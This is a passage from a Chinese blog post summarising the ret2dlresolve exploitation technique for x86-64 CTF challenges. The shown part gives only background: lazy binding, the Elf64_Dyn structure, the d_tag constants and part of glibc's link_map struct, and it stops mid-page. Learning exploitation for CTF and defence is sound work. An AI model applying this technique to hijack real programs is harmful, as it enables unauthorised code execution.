<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>Ret2dlresolve 手法总结 | 花盆</title><meta name="author" content="LittFlower"/><meta name="description" content="Ret2dlresolve 手法总结"/><meta property="og:title" content="Ret2dlresolve 手法总结 | 花盆"/><meta property="og:description" content="Ret2dlresolve 手法总结"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/notes/ret2dlresolve-summary/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="ret2dlresolve" class="scroll-target"><a href="#ret2dlresolve"><code class="hash inline-code">#</code>Ret2dlresolve 手法总结</a></h1>
<p>本文环境为 x86-64，32 位太老了就不学了。</p>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>前置知识</a></h2>
<p>简单回顾一下 ELF 文件格式，具体的看 <a href="https://blog.littflower.top/posts/elf-structure/" title="https://blog.littflower.top/posts/elf-structure/" target="_blank" rel="noopener">ELF 文件结构详解</a></p>
<p>参考文章：</p>
<ol>
<li><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO" title="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO" target="_blank" rel="noopener">Ret2dlresolve攻击——从No RELRO到FULL RELRO</a></li>
<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve" title="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve" target="_blank" rel="noopener">ret2dlresolve</a></li>
</ol>
<h3 id="lazy-binding" class="scroll-target"><a href="#lazy-binding"><code class="hash inline-code">#</code>Lazy Binding</a></h3>
<p>延迟绑定技术，属于是 Pwn 非常基础的知识了，这里不多赘述，需要了解的是执行这一步的函数名是 <code class="inline-code">_dl_runtime_resolve_xsavec</code>，后面会仔细分析。</p>
<h3 id=".dynamic" class="scroll-target"><a href="#.dynamic"><code class="hash inline-code">#</code>.DYNAMIC 节</a></h3>
<p>.dynamic 节则是存放了一些 <code class="inline-code">Elf64_Dyn</code> 结构体，说具体些就是键值对，关键字是各个动态段的标识，值则是各个动态段的对应的基址，即包括上图中的 .ret.plt、.dynsym、dynstr 节等。其主要作用就是在解析函数地址时使用这些键值对来找到各个动态段的基址，以确定数据条目的位置。</p>
<p>在 IDA 里看到的效果一般是下面这样：</p>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/68f77f883203f7be00890c24.png" alt="DYNAMIC段"/></p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#1E754F">typedef</span><span style="color:#AB5959"> struct</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  Elf64_Sxword        d_tag</span><span style="color:#999999">;</span><span style="color:#A0ADA0">           /* Dynamic entry type */</span><br><span style="color:#AB5959">  union</span><br><span style="color:#999999">    </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">      Elf64_Xword d_val</span><span style="color:#999999">;</span><span style="color:#A0ADA0">               /* Integer value */</span><br><span style="color:#393A34">      Elf64_Addr d_ptr</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                /* Address value */</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><span style="color:#393A34"> d_un</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><span style="color:#393A34"> Elf64_Dyn</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#4D9375">typedef</span><span style="color:#CB7676"> struct</span><br><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">  Elf64_Sxword        d_tag</span><span style="color:#666666">;</span><span style="color:#758575DD">           /* Dynamic entry type */</span><br><span style="color:#CB7676">  union</span><br><span style="color:#666666">    </span><span style="color:#4d9375">{</span><br><span style="color:#DBD7CAEE">      Elf64_Xword d_val</span><span style="color:#666666">;</span><span style="color:#758575DD">               /* Integer value */</span><br><span style="color:#DBD7CAEE">      Elf64_Addr d_ptr</span><span style="color:#666666">;</span><span style="color:#758575DD">                /* Address value */</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><span style="color:#DBD7CAEE"> d_un</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><span style="color:#DBD7CAEE"> Elf64_Dyn</span><span style="color:#666666">;</span><br></code></pre></div>
<p>这里键值对的键是 <code class="inline-code">d_tag</code>，可取值如下：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#A0ADA0">/* Legal values for d_tag (dynamic entry type).  */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_NULL</span><span style="color:#2F798A">                0</span><span style="color:#A0ADA0">                /* Marks end of dynamic section */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_NEEDED</span><span style="color:#2F798A">              1</span><span style="color:#A0ADA0">                /* Name of needed library */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_PLTRELSZ</span><span style="color:#2F798A">            2</span><span style="color:#A0ADA0">                /* Size in bytes of PLT relocs */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_PLTGOT</span><span style="color:#2F798A">              3</span><span style="color:#A0ADA0">                /* Processor defined value */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_HASH</span><span style="color:#2F798A">                4</span><span style="color:#A0ADA0">                /* Address of symbol hash table */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_STRTAB</span><span style="color:#2F798A">              5</span><span style="color:#A0ADA0">                /* Address of string table */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_SYMTAB</span><span style="color:#2F798A">              6</span><span style="color:#A0ADA0">                /* Address of symbol table */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_RELA</span><span style="color:#2F798A">                7</span><span style="color:#A0ADA0">                /* Address of Rela relocs */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_RELASZ</span><span style="color:#2F798A">              8</span><span style="color:#A0ADA0">                /* Total size of Rela relocs */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_RELAENT</span><span style="color:#2F798A">             9</span><span style="color:#A0ADA0">                /* Size of one Rela reloc */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_STRSZ</span><span style="color:#2F798A">              10</span><span style="color:#A0ADA0">                /* Size of string table */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_SYMENT</span><span style="color:#2F798A">             11</span><span style="color:#A0ADA0">                /* Size of one symbol table entry */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_INIT</span><span style="color:#2F798A">               12</span><span style="color:#A0ADA0">                /* Address of init function */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_FINI</span><span style="color:#2F798A">               13</span><span style="color:#A0ADA0">                /* Address of termination function */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_SONAME</span><span style="color:#2F798A">             14</span><span style="color:#A0ADA0">                /* Name of shared object */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_RPATH</span><span style="color:#2F798A">              15</span><span style="color:#A0ADA0">                /* Library search path (deprecated) */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_SYMBOLIC</span><span style="color:#2F798A">           16</span><span style="color:#A0ADA0">                /* Start symbol search here */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_REL</span><span style="color:#2F798A">                17</span><span style="color:#A0ADA0">                /* Address of Rel relocs */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_RELSZ</span><span style="color:#2F798A">              18</span><span style="color:#A0ADA0">                /* Total size of Rel relocs */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_RELENT</span><span style="color:#2F798A">             19</span><span style="color:#A0ADA0">                /* Size of one Rel reloc */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_PLTREL</span><span style="color:#2F798A">             20</span><span style="color:#A0ADA0">                /* Type of reloc in PLT */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_DEBUG</span><span style="color:#2F798A">              21</span><span style="color:#A0ADA0">                /* For debugging; unspecified */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_TEXTREL</span><span style="color:#2F798A">            22</span><span style="color:#A0ADA0">                /* Reloc might modify .text */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_JMPREL</span><span style="color:#2F798A">             23</span><span style="color:#A0ADA0">                /* Address of PLT relocs */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_BIND_NOW</span><span style="color:#2F798A">           24</span><span style="color:#A0ADA0">                /* Process relocations of object */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_INIT_ARRAY</span><span style="color:#2F798A">         25</span><span style="color:#A0ADA0">                /* Array with addresses of init fct */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_FINI_ARRAY</span><span style="color:#2F798A">         26</span><span style="color:#A0ADA0">                /* Array with addresses of fini fct */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_INIT_ARRAYSZ</span><span style="color:#2F798A">       27</span><span style="color:#A0ADA0">                /* Size in bytes of DT_INIT_ARRAY */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_FINI_ARRAYSZ</span><span style="color:#2F798A">       28</span><span style="color:#A0ADA0">                /* Size in bytes of DT_FINI_ARRAY */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_RUNPATH</span><span style="color:#2F798A">            29</span><span style="color:#A0ADA0">                /* Library search path */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_FLAGS</span><span style="color:#2F798A">              30</span><span style="color:#A0ADA0">                /* Flags for the object being loaded */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_ENCODING</span><span style="color:#2F798A">           32</span><span style="color:#A0ADA0">                /* Start of encoded range */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_PREINIT_ARRAY</span><span style="color:#2F798A">      32</span><span style="color:#A0ADA0">                /* Array with addresses of preinit fct*/</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_PREINIT_ARRAYSZ</span><span style="color:#2F798A">    33</span><span style="color:#A0ADA0">                /* size in bytes of DT_PREINIT_ARRAY */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_SYMTAB_SHNDX</span><span style="color:#2F798A">       34</span><span style="color:#A0ADA0">                /* Address of SYMTAB_SHNDX section */</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> DT_NUM</span><span style="color:#2F798A">                35</span><span style="color:#A0ADA0">                /* Number used */</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#758575DD">/* Legal values for d_tag (dynamic entry type).  */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_NULL</span><span style="color:#4C9A91">                0</span><span style="color:#758575DD">                /* Marks end of dynamic section */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_NEEDED</span><span style="color:#4C9A91">              1</span><span style="color:#758575DD">                /* Name of needed library */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_PLTRELSZ</span><span style="color:#4C9A91">            2</span><span style="color:#758575DD">                /* Size in bytes of PLT relocs */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_PLTGOT</span><span style="color:#4C9A91">              3</span><span style="color:#758575DD">                /* Processor defined value */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_HASH</span><span style="color:#4C9A91">                4</span><span style="color:#758575DD">                /* Address of symbol hash table */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_STRTAB</span><span style="color:#4C9A91">              5</span><span style="color:#758575DD">                /* Address of string table */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_SYMTAB</span><span style="color:#4C9A91">              6</span><span style="color:#758575DD">                /* Address of symbol table */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_RELA</span><span style="color:#4C9A91">                7</span><span style="color:#758575DD">                /* Address of Rela relocs */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_RELASZ</span><span style="color:#4C9A91">              8</span><span style="color:#758575DD">                /* Total size of Rela relocs */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_RELAENT</span><span style="color:#4C9A91">             9</span><span style="color:#758575DD">                /* Size of one Rela reloc */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_STRSZ</span><span style="color:#4C9A91">              10</span><span style="color:#758575DD">                /* Size of string table */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_SYMENT</span><span style="color:#4C9A91">             11</span><span style="color:#758575DD">                /* Size of one symbol table entry */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_INIT</span><span style="color:#4C9A91">               12</span><span style="color:#758575DD">                /* Address of init function */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_FINI</span><span style="color:#4C9A91">               13</span><span style="color:#758575DD">                /* Address of termination function */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_SONAME</span><span style="color:#4C9A91">             14</span><span style="color:#758575DD">                /* Name of shared object */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_RPATH</span><span style="color:#4C9A91">              15</span><span style="color:#758575DD">                /* Library search path (deprecated) */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_SYMBOLIC</span><span style="color:#4C9A91">           16</span><span style="color:#758575DD">                /* Start symbol search here */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_REL</span><span style="color:#4C9A91">                17</span><span style="color:#758575DD">                /* Address of Rel relocs */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_RELSZ</span><span style="color:#4C9A91">              18</span><span style="color:#758575DD">                /* Total size of Rel relocs */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_RELENT</span><span style="color:#4C9A91">             19</span><span style="color:#758575DD">                /* Size of one Rel reloc */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_PLTREL</span><span style="color:#4C9A91">             20</span><span style="color:#758575DD">                /* Type of reloc in PLT */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_DEBUG</span><span style="color:#4C9A91">              21</span><span style="color:#758575DD">                /* For debugging; unspecified */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_TEXTREL</span><span style="color:#4C9A91">            22</span><span style="color:#758575DD">                /* Reloc might modify .text */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_JMPREL</span><span style="color:#4C9A91">             23</span><span style="color:#758575DD">                /* Address of PLT relocs */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_BIND_NOW</span><span style="color:#4C9A91">           24</span><span style="color:#758575DD">                /* Process relocations of object */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_INIT_ARRAY</span><span style="color:#4C9A91">         25</span><span style="color:#758575DD">                /* Array with addresses of init fct */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_FINI_ARRAY</span><span style="color:#4C9A91">         26</span><span style="color:#758575DD">                /* Array with addresses of fini fct */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_INIT_ARRAYSZ</span><span style="color:#4C9A91">       27</span><span style="color:#758575DD">                /* Size in bytes of DT_INIT_ARRAY */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_FINI_ARRAYSZ</span><span style="color:#4C9A91">       28</span><span style="color:#758575DD">                /* Size in bytes of DT_FINI_ARRAY */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_RUNPATH</span><span style="color:#4C9A91">            29</span><span style="color:#758575DD">                /* Library search path */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_FLAGS</span><span style="color:#4C9A91">              30</span><span style="color:#758575DD">                /* Flags for the object being loaded */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_ENCODING</span><span style="color:#4C9A91">           32</span><span style="color:#758575DD">                /* Start of encoded range */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_PREINIT_ARRAY</span><span style="color:#4C9A91">      32</span><span style="color:#758575DD">                /* Array with addresses of preinit fct*/</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_PREINIT_ARRAYSZ</span><span style="color:#4C9A91">    33</span><span style="color:#758575DD">                /* size in bytes of DT_PREINIT_ARRAY */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_SYMTAB_SHNDX</span><span style="color:#4C9A91">       34</span><span style="color:#758575DD">                /* Address of SYMTAB_SHNDX section */</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> DT_NUM</span><span style="color:#4C9A91">                35</span><span style="color:#758575DD">                /* Number used */</span><br></code></pre></div>
<h3 id="link_map" class="scroll-target"><a href="#link_map"><code class="hash inline-code">#</code>link_map</a></h3>
<p><code class="inline-code">link_map</code> 是描述已加载的共享对象的结构体，采用双链表管理，该数据结构保存在 ld.so 的 .bss 段中。我们主要关注其中几个有意思的字段：</p>
<ol>
<li><code class="inline-code">l_addr</code>：共享对象的加载基址；</li>
<li><code class="inline-code">l_next</code>，<code class="inline-code">l_prev</code>：管理 <code class="inline-code">link_map</code> 的双链表指针；</li>
<li><code class="inline-code">l_info</code>：保存 <code class="inline-code">Elfxx_Dyn</code> 结构体指针的列表，用来寻找各节基址；如 <code class="inline-code">l_info[DT_STRTAB]</code> 指向保存着函数解析字符串表基址的 <code class="inline-code">Elfxx_Dyn</code> 结构体。</li>
</ol>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#A0ADA0">/* Structure describing a loaded shared object.  The `l_next' and `l_prev'</span><br><span style="color:#A0ADA0">   members form a chain of all the shared objects loaded at startup.</span><br><span style="color:#A0ADA0">   These data structures exist in space used by the run-time dynamic linker;</span><br><span style="color:#A0ADA0">   modifying them may have disastrous results.</span><br><span style="color:#A0ADA0">   This data structure might change in future, if necessary.  User-level</span><br><span style="color:#A0ADA0">   programs must avoid defining objects of this type.  */</span><br><span style="color:#AB5959">struct</span><span style="color:#393A34"> link_map</span><br><span style="color:#999999">  </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#A0ADA0">    /* These first few members are part of the protocol with the debugger.</span><br><span style="color:#A0ADA0">       This is the same format used in SVR4.  */</span><br><span style="color:#59873A">    ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Addr</span><span style="color:#1e754f">)</span><span style="color:#393A34"> l_addr</span><span style="color:#999999">;</span><span style="color:#A0ADA0">             /* Difference between the address in the ELF</span><br><span style="color:#A0ADA0">                                   file and the addresses in memory.  */</span><br><span style="color:#AB5959">    char</span><span style="color:#AB5959"> *</span><span style="color:#393A34">l_name</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                /* Absolute file name object was found in.  */</span><br><span style="color:#59873A">    ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Dyn</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34">l_ld</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                /* Dynamic section of the shared object.  */</span><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> link_map </span><span style="color:#AB5959">*</span><span style="color:#393A34">l_next</span><span style="color:#999999">,</span><span style="color:#AB5959"> *</span><span style="color:#393A34">l_prev</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> /* Chain of loaded objects.  */</span><br><span style="color:#A0ADA0">    /* All following members are internal to the dynamic linker.</span><br><span style="color:#A0ADA0">       They may change without notice.  */</span><br><span style="color:#A0ADA0">    /* This is an element which is only ever different from a pointer to</span><br><span style="color:#A0ADA0">       the very same copy of this type for ld.so when it is used in more</span><br><span style="color:#A0ADA0">       than one namespace.  */</span><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> link_map </span><span style="color:#AB5959">*</span><span style="color:#393A34">l_real</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">    /* Number of the namespace this link map belongs to.  */</span><br><span style="color:#998418">    Lmid_t</span><span style="color:#393A34"> l_ns</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> libname_list </span><span style="color:#AB5959">*</span><span style="color:#393A34">l_libname</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">    ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Dyn</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#B07D48">l_info</span><span style="color:#1e754f">[</span><span style="color:#393A34">DT_NUM </span><span style="color:#AB5959">+</span><span style="color:#393A34"> DT_THISPROCNUM </span><span style="color:#AB5959">+</span><span style="color:#393A34"> DT_VERSIONTAGNUM </span><span style="color:#AB5959">+</span><span style="color:#393A34"> DT_EXTRANUM </span><span style="color:#AB5959">+</span><span style="color:#393A34"> DT_VALNUM </span><span style="color:#AB5959">+</span><span style="color:#393A34"> DT_ADDRNUM</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    const</span><span style="color:#59873A"> ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Phdr</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34">l_phdr</span><span style="color:#999999">;</span><span style="color:#A0ADA0">        /* Pointer to program header table in core.  */</span><br><span style="color:#59873A">    ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Addr</span><span style="color:#1e754f">)</span><span style="color:#393A34"> l_entry</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                /* Entry point location.  */</span><br><span style="color:#59873A">    ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Half</span><span style="color:#1e754f">)</span><span style="color:#393A34"> l_phnum</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                /* Number of program header entries.  */</span><br><span style="color:#59873A">    ElfW</span><span style="color:#1e754f">(</span><span style="color:#393A34">Half</span><span style="color:#1e754f">)</span><span style="color:#393A34"> l_ldnum</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                /* Number of dynamic segment entries.  */</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#758575DD">/* Structure describing a loaded shared object.  The `l_next' and `l_prev'</span><br><span style="color:#758575DD">   members form a chain of all the shared objects loaded at startup.</span><br><span style="color:#758575DD">   These data structures exist in space used by the run-time dynamic linker;</span><br><span style="color:#758575DD">   modifying them may have disastrous results.</span><br><span style="color:#758575DD">   This data structure might change in future, if necessary.  User-level</span><br><span style="color:#758575DD">   programs must avoid defining objects of this type.  */</span><br><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> link_map</span><br><span style="color:#666666">  </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#758575DD">    /* These first few members are part of the protocol with the debugger.</span><br><span style="color:#758575DD">       This is the same format used in SVR4.  */</span><br><span style="color:#80A665">    ElfW</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Addr</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> l_addr</span><span style="color:#666666">;</span><span style="color:#758575DD">             /* Difference between the address in the ELF</span><br><span style="color:#758575DD">                                   file and the addresses in memory.  */</span><br><span style="color:#CB7676">    char</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">l_name</span><span 